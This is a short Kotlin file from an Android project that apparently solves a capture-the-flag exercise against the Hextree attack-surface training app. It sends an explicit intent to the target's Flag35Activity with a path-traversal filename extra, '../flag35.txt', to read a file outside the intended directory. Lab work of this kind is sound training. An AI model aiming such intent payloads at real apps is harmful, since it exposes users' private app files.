package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import androidx.activity.result.ActivityResultLauncher

object Flag35 {
    fun getFlag(context: Context, launcher: ActivityResultLauncher<Intent>) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag35Activity"
            )
            putExtra("filename", "../flag35.txt")
        }
        launcher.launch(intent)
    }
}
